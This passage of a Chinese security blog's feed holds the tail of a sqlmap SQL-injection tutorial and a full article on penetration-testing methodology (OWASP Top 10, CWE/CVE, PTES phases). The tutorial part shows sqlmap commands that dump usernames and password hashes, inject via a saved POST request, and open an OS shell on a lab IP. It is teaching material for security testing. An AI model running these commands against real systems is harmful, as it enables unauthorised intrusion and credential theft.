&quot;username,password&quot; --dump</span><br><span class="line"></span><br><span class="line">+----------+----------------------------------+ | username | password| +----------+----------------------------------+</span><br><span class="line"> admin| 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">| ajest| e10adc3949ba59abbe56e057f20f883e | +----------+----------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-1-4-POST-注入"><a href="#5-1-4-POST-注入" class="headerlink" title="5.1.4  POST 注入"></a><strong>5.1.4</strong>  <strong>POST</strong> <strong>注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r /tmp/login.post</span><br></pre></td></tr></table></figure><h4 id="5-1-5-GetShell"><a href="#5-1-5-GetShell" class="headerlink" title="5.1.5  GetShell"></a><strong>5.1.5</strong>  <strong>GetShell</strong></h4><ul><li>受到secure_file_priv 选项的限制；</li><li>目标系统Web 根目录的绝对路径；</li><li>目录权限。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.16.119/show.php?id=33&quot; --os-shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试方法论</title>
      <link href="/2022/11/03/%E6%BC%8F%E6%B4%9E/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
      <url>/2022/11/03/%E6%BC%8F%E6%B4%9E/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-渗透测试种类"><a href="#1-渗透测试种类" class="headerlink" title="1.渗透测试种类"></a>1.渗透测试种类</h1><h4 id="1-1渗透测试种类"><a href="#1-1渗透测试种类" class="headerlink" title="1.1渗透测试种类"></a>1.1渗透测试种类</h4><pre><code>攻击与防御，攻击典型代表就是黑客入侵，非法的和渗透测试，合法的等工作。防御的典型代表等级保护、安全基线检查与加固、安全设备等。渗透测试（penetration testing, pentest）是模拟黑客攻击，实施安全评估（即审计）的具体手段。方法论是在制定、实施信息安全审计方案时，需要遵循的规则、惯例和过程。人们在评估网络、应用、系统或三者组合的安全状况时，不断摸索各种务实的理念和成熟的做法，并总结了一套理论 -渗透测试方法论。</code></pre><p>关键词：</p><ul><li><p>安全弱点</p></li><li><p>安全风险</p></li><li><p>安全漏洞</p></li></ul><p>“千里之堤，毁于蚁穴”。</p><p>渗透测试与红队（Red Team）不同：</p><ul><li><p>红队是攻击队伍，想尽一切办法入侵目标系统。</p></li><li><p>渗透测试是尽可能的披露目标系统的安全弱点、风险、漏洞等，任何安全问题都不要放过。</p></li><li><p>渗透测试的目的为安全加固，漏洞修复做准备。</p></li></ul><h4 id="1-2-黑盒测试"><a href="#1-2-黑盒测试" class="headerlink" title="1.2 黑盒测试"></a>1.2 黑盒测试</h4><pre><code>在进行黑盒测试时，渗透测试工程师在不清楚被测单位的内部技术构造的情况下，从外部评估网络基础设施（网络，应用，系统，目标资产等）的安全性。在渗透测试的各个阶段，黑盒测试借助真实世界的黑客技术，暴露出目标的安全问题，甚至可以揭露尚未被他人利用的安全弱点。工程师应该能理解安全弱点，并将安全弱点进行分类按照风险等级（高、中、低）对其排序。通常来说，风险级别取决于相关弱点可能形成危害的大小。有经验的工程师应能够确定漏洞利用的所有攻击手法和模式。当测试人员完成黑盒测试的所有工作之后，他们会把与测试对象安全状况有关的必要信息进行整理，并使用业务的语言描述这些被识别出来的风险，继而将之汇总为书面报告。黑盒测试的市场报价通常会高于白盒测试。关键点：</code></pre><ul><li><p>不清楚内部单位技术构造</p></li><li><p>模拟黑客攻击的过程</p></li><li><p>漏洞评级</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高危</span><br><span class="line">中危</span><br><span class="line">低危</span><br><span class="line"></span><br><span class="line">信息级别</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-3-白盒测试"><a href="#1-3-白盒测试" class="headerlink" title="1.3  白盒测试"></a><strong>1.3</strong>  白盒测试</h4><pre><code>    白盒测试的审计员可以获取被测单位的各种内部资料甚至不公开资料，所以渗透测试人员的视野更为开阔。若以白盒测试的方法评估安全漏洞，测试人员可以以最小的工作量达到最高的评估精确度。白盒测试从被测系统环境自身出发，全面消除内部安全问题。从而增加了从单位外部渗透系统的难度。黑盒测试起不到这样的作用。白盒测试所需要的步骤数目与黑盒测试不相上下。另外，若能将白盒测试与常规的研发生命周期相结合，就可以在入侵者发现甚至利用安全弱点之前，尽可能最早地消除全部安全隐患。这使得白盒测试的时间、成本，以及发现、解决安全弱点的技术门槛都全面低于黑盒测试。关键点：</code></pre><ul><li><p>获取被测单位全部资料或者有限资料</p></li><li><p>代码审计</p></li><li><p>可以与应用的研发生命周期相结合（Security Development Lifecycle，SDL）</p></li></ul><h4 id="1-4脆弱性评估"><a href="#1-4脆弱性评估" class="headerlink" title="1.4脆弱性评估"></a><strong>1.4</strong>脆弱性评估</h4><pre><code>    脆弱性评估通过分析企业资产面临安全威胁的情况和程度，评估内部和外部的的安全控制的安全性。这种技术上的信息系统评估，不仅揭露现有防范措施里存在的风险，而且要提出多重备选的补救策略，并将这些策略进行比较。内部的脆弱性评估可保证内部系统的安全性，而外部的脆弱性评估则是验证边界防护（perimeter defenses）的有效性。无论进行内部脆弱性评估还是进行外部脆弱性评估，评估人员都会采用各种攻击模式来严格测试网络资产的安全性，从而验证信息系统处理安全威胁的能力，进而确定应对措施的有效性。不同类型的脆弱性评估需要的测试流程、测试工具和自动化测试技术也不相同。这可以通过一体化的安全弱点管控（vulnerability management）平台来实现。现在的安全弱点管理平台带有可自动更新的漏洞数据库，能够测试不同类型的网络设备，而且不会影响配置管理和变更管理的完整性。    脆弱性评估和渗透测试两者最大的区别就是：渗透测试不仅要识别目标的弱点，它还涉及在目标系统上进行漏洞利用、权限提升和访问维护。换句话说，脆弱性评估虽然可以充分发现系统里的缺陷，但是不会考虑去衡量这些缺陷对系统造成的危害。另外，相比脆弱性评估，渗透测试更倾向于入侵，会刻意使用各种技术手段利用安全漏洞；所以渗透测试可能对生产环境带来实际的破坏性影响。而脆弱性评估以非入侵的方式，定性、定量得识别已知安全弱点。    关键点：</code></pre><ul><li><p>黑盒测试 &#x3D; 安全弱点、风险、漏洞的发现 + 漏洞利用 + 后渗透</p></li><li><p>脆弱性评估 &#x3D; 安全弱点、风险、漏洞的发现</p></li><li><p>脆弱性评估的方法，包括漏洞扫描，手工挖掘。</p></li></ul><h1 id="2-安全测试方法论"><a href="#2-安全测试方法论" class="headerlink" title="2.安全测试方法论"></a>2.安全测试方法论</h1><h4 id="2-1-OWASP"><a href="#2-1-OWASP" class="headerlink" title="2.1  OWASP"></a><strong>2.1</strong>  <a href="https://owasp.org/"><strong>OWASP</strong></a></h4><p>开放式Web 应用程序安全项目（Open Web Application Security Project，OWASP）。</p><ul><li><p><a href="https://owasp.org/www-project-web-security-testing-guide/">Web 安全测试指南</a></p></li><li><p><a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a></p></li><li><p><a href="https://owasp.org/www-project-top-ten/">OWASP TOP 10</a></p></li></ul><h6 id="2-1-1-OWASP-TOP-10"><a href="#2-1-1-OWASP-TOP-10" class="headerlink" title="2.1.1  OWASP TOP 10"></a><strong>2.1.1</strong>  <strong>OWASP</strong> <strong>TOP</strong> <strong>10</strong></h6><p><code>**OWASP TOP 10 - 2021**</code></p><table><thead><tr><th align="center">项目</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">A01：2021  - 失效的访问控制  Broken Access  Control</td><td align="center">访问控制强制实施策略，使用户无法在其预期权限之外进行操作。失败的访问控制通常会导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。</td></tr><tr><td align="center">A02：2021 - 加密机制失效Cryptographic  Failures</td><td align="center">首先要确认：对传输中数据和存储数据都有哪些保护需求。例如，密码、信用卡号、医疗记录、个人信息和商业秘密需要额外保护，尤其是在这些数据属于隐私保护法(如：欧盟GDPR) 或法规条例(如：金融数据保护标准PCI DSS)适用范围的情况下。</td></tr><tr><td align="center">A03：2021 - 注入  Injection</td><td align="center">在以下情况下,应用程序易受攻击:  * 应用程序不会验证、过滤或清洗用户提供的数据。  * 动态查询或无上下文感知转义的非参数化调用直接在解释器中使用。  * 恶意数据在对象关系映射（ORM）搜索参数中用于提取额外的敏感记录。  * 恶意数据被直接使用或连接。SQL 或命令包含动态查询、命令或存储过程中的结构和恶意数据。</td></tr><tr><td align="center">A04：2021 -  不安全设计  Insecure Design</td><td align="center">不安全设计是一个广泛的类别，代表不同的弱点。表示为“缺少或无效的控制设计”。不安全设计不是所有其他前10个风险类别的来源。不安全设计和不安全的实现之间存在差异。我们区分设计缺陷和实现缺陷是有原因的，它们有不同的根本原因和补救措施。安全设计仍然可能存在实现缺陷，从而导致可能被利用的漏洞。一个不安全设计不能通过一个完美的实现来修复，因为根据定义，所需的安全控制从未被创建来抵御特定的攻击。导致不安全设计的因素之一是开发的软件或系统中缺乏固有的业务风险分析，因此无法确定需要何种级别的安全设计。</td></tr><tr><td align="center">A05：2021 - 安全配置错误  Security  Misconfiguration</td><td align="center">您的应用程序可能受到攻击,如果应用程序是：  * 应用程序栈的任何部分缺少适当的安全加固，或者云服务的权限配置错误。  * 应用程序启用或安装了不必要的功能(例如：不必要的端口、服务、网页、帐户或权限)。* 默认帐户和密码仍然可用且没有更改。  * 错误处理机制向用户纰漏堆栈信息或其他大量错误信息。* 对于升级的系统，最新的安全特性被禁用或未安全配置。  * 应用程序服务器、应用程序框架(如:Struts、Spring、ASP.NET)、库文件、数据库等没有进行安全配置。* 服务器不发送安全标头或指令，或未被设定安全参数。  * 您的应用软件已过期或易受攻击(参见“A6:2021-脆弱和过时的组件”)。</td></tr></tbody></table><table><thead><tr><th>A06：2021 -  自带缺陷和过时的组件Vulnerable and  Outdated  Components</th><th>如果满足下面的某个条件，那么您的应用就易受此类攻击：  * 如果您不知道所有使用的组件版本信息(包括：服务端和客户端)。这包括了直接使用的组件或间接依赖的组件。* 如果软件易受攻击，不再支持或者过时。这包括：系统、Web服务器、应用程序服务器、数据库管理系统(DBMS)、应用程序、API 和所有的组件、运行环境和库。  * 如果您没有定期做漏洞扫描和订阅使用组件的安全公告。  * 如果您不基于风险及时修复或升级底层平台、框架和依赖库。很可能发生这种情况：根据变更控制，每月或每季度进行升级，这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。  * 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。* 如果您没有对组件进行安全配置(参见“A05:2021–安全配置错误”)。</th></tr></thead><tbody><tr><td>A07：2021 - 身份识别和身份验证错误Identification and  Authentication  Failures</td><td>* 允许像是攻击者已经拥有有效用户名称和密码列表的撞库自动化攻击。* 允许暴力或其他自动化攻击。  * 允许预设、脆弱、常见的密码,像是Password1 或admin&#x2F;admin。  * 使用脆弱或无效的认证资讯回复或忘记密码的流程，如不安全的”知识相关问答”。  * 使用明码、被加密的或使用较脆弱杂凑法的密码(参考A3: 2017-敏感性资料泄漏)。<a href="https://github.com/OWASP/Top10/issues/553">(TODO)</a>  *  不具有或是无效的多因素认证。  *  于URL 中泄漏会话（session）ID(如URL 重写)。* 成功登入后没有轮换会话（session）ID。  * 没 有 正 确 的 注 销 会 话 (session) ID。 用 户 的 会 话 （session） 或 认 证 tokens（主 要 是 单 一 登 入（SSO）token） 没有在登出时或一段时间没活动时被适当的注销。</td></tr><tr><td>A08：2021 - 软件和数据完整性故障Software and Data  Integrity  Failures</td><td>软件和数据完整性故障与无法防止违反完整性的代码和基础设施有关。这方面的一个例子是，应用程序依赖于不受信任的源、存储库和内容分发网络(CDN)的插件、库或模块。不安全的CI&#x2F;CD 管道可能会带来未经授权的访问、恶意代码或系统安全风险。最后，许多应用程序现在包括自动更新功能。其中，更新包在没有进行充足完整性验证的情况下被下载，并应用于以前受信任的应用程序。攻击者可能会上传自己的更新包，以便在所有安装上分发和运  行。另一个例子是，对象或数据被编码或序列化为攻击者可以看到和修改的结构，很容易受到不安全的反序列化的影响。</td></tr><tr><td>A09：2021 - 安全日志和监控故障Security Logging and  Monitoring  Failures</td><td>2021 年版OWASP Top 10 中，该类别是为了帮助检测、升级和应对活跃的违规行为。如果不进行日志记录和监测，就无法发现违规行为。任何时候都会发生日志记录、检测、监视和主动响应不足的情况：  * 需要审计的事件，例如：登录、失败的登录和高价值交易，但未记录。* 警告和错误未生成日志或日志记录不充分或日志消息不清晰。  * 应用程序和API 的日志未进行安全可疑活动的监控。* 日志只存储在本地。  * 适当的警报阈值和响应升级过程不到位或无效。  * 渗透测试和动态应用安全测试（DAST）工具(例如：<a href="https://www.zaproxy.org/">OWASP ZAP</a>)的扫描没有触发警报。* 应用无法实时或接近实时地检测、升级或或对主动攻击发出警报。  * 如果让用户或攻击者看到日志和警报事件，您就容易受到信息泄露的攻击(查看“A01:2021-失效的访问控制”)。</td></tr><tr><td>A10：2021  - 服务端请求伪造  Server-Side Request  Forgery</td><td>一旦Web 应用在获取远程资源时没有验证用户提供的URL，就会出现SSRF 缺陷。它允许攻击者强制应用程序发送一个精心构建的请求到一个意外目的地，即使是在有防火墙、VPN 或其他类型的网络访问控制列表（ACL）保护的情况下。随着现代Web 应用为终端用户提供便利的功能，获取URL 成为一种常见的场景。因此，SSRF 安全攻击事件也在不断增加。此外，由于云服务和架构的复杂性，SSRF 的严重性也越来越高。</td></tr></tbody></table><p><code>**OWASP TOP 10 - 2017**</code></p><table><thead><tr><th>A2:2017- 失效的身份认证</th><th>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。  （固定会话攻击）（Web 表单爆破）</th></tr></thead><tbody><tr><td>A3:2017- 敏感数据泄露</td><td>许多Web 应用程序和API 都无法正确保护敏感数据，例如：财务数据、医疗数据和PII 数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。  （网站后台管理员账密明文传输 - HTTP）（phpinfo()）</td></tr><tr><td>A4:2017-  XML 外部实体 （XXE）</td><td>许多较早的或配置错误的XML 处理器评估了XML 文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI 文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。  （XXE）</td></tr><tr><td>A5:2017- 失效的访问控制</td><td>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。  （DVWA）</td></tr><tr><td>A6:2017- 安全配置错误</td><td>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</td></tr><tr><td>A7:2017- 跨站脚本 （XSS）</td><td>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建HTML 或 JavaScript 的浏览器API 更新现有的网页时，就会出现XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</td></tr><tr><td>A8:2017-  不安全的反序列化</td><td>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。  （Weblogic）</td></tr><tr><td>A9:2017- 使用含有已知漏洞的组件</td><td>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API 可能会破坏应用程序防御、造成各种攻击并产生严重影响。  （phpStudy 2016 后门）</td></tr><tr><td>A10:2017- 不足的日志记录和监控</td><td>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200 天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</td></tr></tbody></table><h4 id="2-2-CWE"><a href="#2-2-CWE" class="headerlink" title="**2.2 CWE"></a>**2.2 <a href="https://cwe.mitre.org/"><strong>CWE</strong></a></h4><p>通用缺陷列表（Common Weakness Enumeration，CWE）漏洞类别的编号：</p><ul><li><a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></li><li><a href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a></li></ul><h4 id="2-3-CVE"><a href="#2-3-CVE" class="headerlink" title="**2.3 CVE"></a>**2.3 <strong>CVE</strong></h4><p>通用漏洞与披露（Common Vulnerabilities and Exposures，CVE）</p><p>具体某一个漏洞的编号：</p><p><a href="http://cve.mitre.org/">国外官网</a></p><h4 id="2-4-安全公告"><a href="#2-4-安全公告" class="headerlink" title="2.4 安全公告"></a><strong>2.4</strong> 安全公告</h4><h6 id="2-4-1-微软安全公告"><a href="#2-4-1-微软安全公告" class="headerlink" title="2.4.1  微软安全公告"></a><strong>2.4.1</strong>  <a href="https://docs.microsoft.com/zh-cn/security-updates/"><strong>微软安全公告</strong></a></h6><p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">MS17-010</a></p><h6 id="2-4-2-Apache-漏洞公告"><a href="#2-4-2-Apache-漏洞公告" class="headerlink" title="2.4.2  Apache 漏洞公告"></a><strong>2.4.2</strong>  <strong>Apache</strong> <strong>漏洞公告</strong></h6><ul><li><p><a href="https://httpd.apache.org/security_report.html">Apache HTTPD</a> </p></li><li><p><a href="https://tomcat.apache.org/security.html">Apache Tomcat</a></p></li><li><p><a href="https://cwiki.apache.org/confluence/display/WW/Security+Bulletins">Apache Strtus2</a></p></li><li><p><a href="https://logging.apache.org/log4j/2.x/security.html">Apache log4j</a></p></li><li><p><a href="https://shiro.apache.org/security-reports.html">Apache Shiro</a></p></li></ul><h6 id="2-4-3-Oracle-漏洞公告"><a href="#2-4-3-Oracle-漏洞公告" class="headerlink" title="2.4.3  Oracle 漏洞公告"></a><strong>2.4.3</strong>  <strong>Oracle</strong> <strong>漏洞公告</strong></h6><p><a href="https://bugs.mysql.com/">MySQL</a></p><h4 id="2-5-其他方法论"><a href="#2-5-其他方法论" class="headerlink" title="2.5 其他方法论"></a><strong>2.5</strong> 其他方法论</h4><p><a href="http://projects.webappsec.org/">Web 应用安全联合威胁分类（Web Application Security Consortium Threat Classification，WASC-TC）</a></p><h1 id="3-渗透测试流程"><a href="#3-渗透测试流程" class="headerlink" title="3.渗透测试流程"></a>3.渗透测试流程</h1><h4 id="3-1-通用渗透测试框架"><a href="#3-1-通用渗透测试框架" class="headerlink" title="3.1  通用渗透测试框架"></a><strong>3.1</strong>  通用渗透测试框架</h4><pre><code>    从技术管理的角度来看，遵循正规的测试框架对安全测试极为重要。通用渗透测试框架涵盖了典型的审计测试工作和渗透测试工作会涉及到的各个阶段。    无论是进行白盒测试还是黑盒测试，选择和使用测试步骤都是测试人员的责任。在测试开始前，测试人员需要根据目标系统的实际环境和已掌握的相关目标系统的情况，再指定最佳的测试策略。</code></pre><p>相关阶段如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.范围界定</span><br><span class="line">2.信息搜集</span><br><span class="line">3.目标识别</span><br><span class="line">4.服务枚举</span><br><span class="line">5.漏洞映射</span><br><span class="line">6.社会工程学</span><br><span class="line">7.漏洞利用</span><br><span class="line">8.权限提升</span><br><span class="line">9.访问维护</span><br><span class="line">10. 文档报告</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="3-1-1-范围界定"><a href="#3-1-1-范围界定" class="headerlink" title="3.1.1  范围界定"></a><strong>3.1.1</strong>  <strong>范围界定</strong></h6><p>在开始技术性安全评估之间，务必要观察、研究目标环境的被测范围。同时还要了解，这个范围牵扯多少个单位，是单个单位还是多个单位会参与到安全评估的工作中来，在范围界定阶段，需要考虑的典型因素如下：</p><ul><li><p>确定目标；</p></li><li><p>取得授权；</p></li><li><p>应当采取何种测试方法？</p></li><li><p>有哪些在测试过程中需要满足的条件？哪些因素可能会限制测试执行的过程？需要多久才能完成测试？</p></li><li><p>此次测试应当达成什么样的任务目标？</p></li><li><p>是否是复测？</p></li></ul><h6 id="3-1-2-信息搜集"><a href="#3-1-2-信息搜集" class="headerlink" title="3.1.2  信息搜集"></a><strong>3.1.2</strong>  <strong>信息搜集</strong></h6><pre><code>    外围信息收集，非接触式信息收集。    在划定了测试范围之后，就需要进入信息收集阶段。在这个阶段，渗透人员需要使用各种公开资源尽可能地获取测试目标的相关信息。他们搜集信息的互联网渠道主要有：</code></pre><ul><li><p>论坛</p></li><li><p>公告板</p></li><li><p>新闻组</p></li><li><p>媒体文章</p></li><li><p>博客</p></li><li><p>社交网络</p></li><li><p>github</p></li><li><p>其他商业或非商业性的网站。</p><pre><code>  此外，他们也可以借助各种搜索引擎中获取相关数据，如谷歌、雅虎、MSN 必应、百度等。收集的信息主要包括:</code></pre></li><li><p>DNS 服务器</p></li><li><p>路由关系</p></li><li><p>whois 数据库电子邮件地址电话号码</p></li><li><p>个人信息</p></li><li><p>用户账户</p></li></ul><p>收集的信息越多，渗透测试成功的概率越高。</p><h6 id="3-1-3-目标识别"><a href="#3-1-3-目标识别" class="headerlink" title="3.1.3  目标识别"></a><strong>3.1.3</strong>  <strong>目标识别</strong></h6><pre><code>    这个阶段的主要任务是识别目标的网络状态、操作系统和网络架构。该阶段工作旨在完整地展现目标网络里各种联网设备或技术的完整关系，以帮助测试人员在接下来的工作里枚举目标网络的各种服务。</code></pre><ul><li><p>扫IP； </p></li><li><p>哪些设备在线？</p></li><li><p>如何去访问？</p></li></ul><h6 id="3-1-4-服务枚举"><a href="#3-1-4-服务枚举" class="headerlink" title="3.1.4  服务枚举"></a><strong>3.1.4</strong>  <strong>服务枚举</strong></h6><pre><code>    这一阶段会根据前面各个阶段的成果，进一步找出目标系统中所有开放的端口。一旦找到了所有开放的端口，就可以通过这些端口来列出目标系统上运行的服务。主机上开放的端口都有相应的服务程序，对这些信息进行深度分析之后，可进一步发掘目标网络基础设施中可能存在的漏洞。</code></pre><ul><li><p>扫端口；</p></li><li><p>开放的端口；</p></li><li><p>运行的服务。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">技术架构</span><br><span class="line">Web  容器</span><br><span class="line">开发语言以及框架</span><br><span class="line">前后端分离</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="3-1-5-漏洞映射"><a href="#3-1-5-漏洞映射" class="headerlink" title="3.1.5  漏洞映射"></a><strong>3.1.5</strong>  <strong>漏洞映射</strong></h6><pre><code>    可以根据已经发现的开放端口和服务程序，查找、分析目标系统中存在的漏洞。如果能够采用自动和手动这两种不同的测试方法结合起来，审计人员对目标系统的认知就会更为清晰、透彻，并能够仔细地检查任何已知和未知的漏洞。</code></pre><ul><li><p>扫漏洞；</p></li><li><p>漏洞挖掘：手工 + 工具；FUZZ 测试。</p></li></ul><h6 id="3-1-6-社会工程学"><a href="#3-1-6-社会工程学" class="headerlink" title="3.1.6  社会工程学"></a><strong>3.1.6</strong>  <strong>社会工程学</strong></h6><pre><code>    如果目标网络没有直接的入口，欺骗的艺术将起到抛砖引玉的重要作用。对目标组织中的人员进行定向攻击，很有可能帮助我们找到渗透目标系统的入口。例如，诱使用户运行安装存在后门的恶意程序，就可能为审计人员的渗透工作形成突破。社会工程学渗透分为多种不同实现形式。</code></pre><ul><li><p>伪装成网络管理员，通过电话要求用户提供自己的账户信息；</p></li><li><p>发送钓鱼邮件来劫持用户的银行账户；</p></li><li><p>诱使某人出现在某个地点。</p><pre><code>  在社会工程学中，达成同一既定目标的实现方式应有尽有。需要注意的是，在对目标实施欺骗以达成渗透目标之前，多数情况下需要长时间研究目标人员的心理。另外，在开展这个阶段的工作之前，您需要研究国内的法律是否有关于社会工程学的相关条款。</code></pre></li></ul><h6 id="3-1-7-漏洞利用"><a href="#3-1-7-漏洞利用" class="headerlink" title="3.1.7  漏洞利用"></a><strong>3.1.7</strong>  <strong>漏洞利用</strong></h6><pre><code>    在仔细检查和发现目标系统中的漏洞之后，就可以使用已有的漏洞利用程序对目标系统进行渗透。审计人员可以把客户端漏洞利用程序和社会工程学进行结合，进而控制目标系统。这个阶段的主要任务是访问目标系统。这个流程可以分为三步，涉及攻击前、攻击、攻击后的相关行动。</code></pre><h6 id="3-1-8-权限提升"><a href="#3-1-8-权限提升" class="headerlink" title="3.1.8  权限提升"></a><strong>3.1.8</strong>  <strong>权限提升</strong></h6><pre><code>    获取目标系统的控制权是渗透成功的标识。接下来，工程师就可以根据其所拥有的访问权限，在被测系统中自由发挥。审计人员也可以使用适用于目标系统的本地漏洞来提升自己的权限。只要他们能够在目标系统上运行提权漏洞利用程序，就可以获得主机的超级用户权限或者系统级权限。工程师还可以以该主机为跳板，进一步攻击局域网络。根据之前渗透范围的界定（授权），审计人员接下来会开展的攻击可能是受限制的，也可能是不受限制。然后，他们很有可能个以各种方式获得与控制系统有关的更多信息。具体的说，他们可能是用嗅探手段截获网络数据包，破解各种服务的密码，在局域网络中使用网络欺骗手段。所以说，提升权限的最终目的是获得目标系统的最高访问权限。</code></pre><h6 id="3-1-9-访问维护"><a href="#3-1-9-访问维护" class="headerlink" title="3.1.9  访问维护"></a><strong>3.1.9</strong>  <strong>访问维护</strong></h6><pre><code>    多数情况下，审计人员需要在一段时间内维护他们对目标系统的访问权限。例如，在演示越权访问目标系统的时候，安装后门将节省重新渗透目标系统所耗费的大量时间。这种情况下，访问维护将节约获取目标系统访问权限所需要的时间、花费和资源。审计人员可以通过一些秘密的通信隧道，在既定时间内维持对目标的访问权限。这些隧道往往基于特定协议、代理或者点对点方法的后门程序。这种对系统的访问方法可以清楚地展示，入侵人员在目标系统实施攻击时隐藏行踪的具体方法。</code></pre><ul><li><p>埋藏后门；</p></li><li><p>隧道技术。</p></li></ul><h6 id="3-1-10-文档报告"><a href="#3-1-10-文档报告" class="headerlink" title="3.1.10 文档报告"></a>3.1.10 文档报告</h6><pre><code>    在渗透测试的最后一个环节里，审计人员要记录、报告并现场演示那些已经识别、验证和利用了的安全漏洞。在被测单位的管理和技术团队会检查渗透时使用的方法，并会根据这些文档修补所有存在的安全漏洞。所以从道德角度来看，文档报告的工作十分重要。为了帮助管理人员和技术人员共同理解、分析当前IT 基础架构中的薄弱环节，可能需要给不同的部门撰写不同措辞的书面报告。</code></pre><h4 id="3-2渗透测试执行标准"><a href="#3-2渗透测试执行标准" class="headerlink" title="3.2渗透测试执行标准"></a>3.2渗透测试执行标准</h4><p><a href="http://www.pentest-standard.org/index.php/Main_Page">渗透测试执行标准（Penetration Testing Execution Standard，PTES）</a>的先驱都是渗透测试行业的精英。</p><p>渗透测试执行标准包含两个部分：PTES 方法论；PTES 技术指南。</p><p>这个标准有渗透测试7 个阶段的标准组成，可以在任意环境中进行富有成果的渗透测试。</p><h6 id="3-2-1-七个阶段"><a href="#3-2-1-七个阶段" class="headerlink" title="3.2.1 七个阶段"></a><strong>3.2.1</strong> <strong>七个阶段</strong></h6><ul><li><p>事前互动</p></li><li><p>情报搜集</p></li><li><p>威胁建模</p></li><li><p>漏洞分析</p></li><li><p>漏洞利用</p></li><li><p>深度利用</p></li><li><p>书面报告</p></li></ul><h6 id="3-2-2-主要特点优势"><a href="#3-2-2-主要特点优势" class="headerlink" title="3.2.2  主要特点优势"></a><strong>3.2.2</strong>  <strong>主要特点优势</strong></h6><p><strong>1.1.1</strong>  <strong>主要特点优势</strong></p><ul><li><p>它是非常全面的渗透测试框架，涵盖了渗透测试的技术方面和其他重要方面，如范围蔓延（scope creep）、报告，以及渗透测试人员保护自身的方法。</p></li><li><p>它介绍了多数测试任务的具体方法，可指导您准确测试目标系统的安全状态。它汇聚了多名日行一“渗”的渗透测试专家的丰富经验。</p></li><li><p>它包含了最常用的以及很罕见的相关技术。</p></li><li><p>它浅显易懂，您可根据测试工作的需要对相应测试步骤进行调整。</p></li></ul><h4 id="3-3-简化渗透测试流程"><a href="#3-3-简化渗透测试流程" class="headerlink" title="3.3 简化渗透测试流程"></a><strong>3.3</strong> 简化渗透测试流程</h4><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/73b2480f4096454d94d5afd4b1726fbe.png" alt="在这里插入图片描述"></p><h4 id="3-4黑客攻击流程"><a href="#3-4黑客攻击流程" class="headerlink" title="3.4黑客攻击流程"></a>3.4黑客攻击流程</h4><h6 id="3-4-1-黑客攻击一般过程"><a href="#3-4-1-黑客攻击一般过程" class="headerlink" title="3.4.1  黑客攻击一般过程"></a><strong>3.4.1</strong>  <strong>黑客攻击一般过程</strong></h6><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/0dd33d220c0b4f6fa3ff6548e3519805.png" alt="在这里插入图片描述"></p><h6 id="3-4-2-c2攻击过程"><a href="#3-4-2-c2攻击过程" class="headerlink" title="3.4.2 c2攻击过程"></a>3.4.2 c2攻击过程</h6><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/4bd043a0470f470ea8775d54b21f7888.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
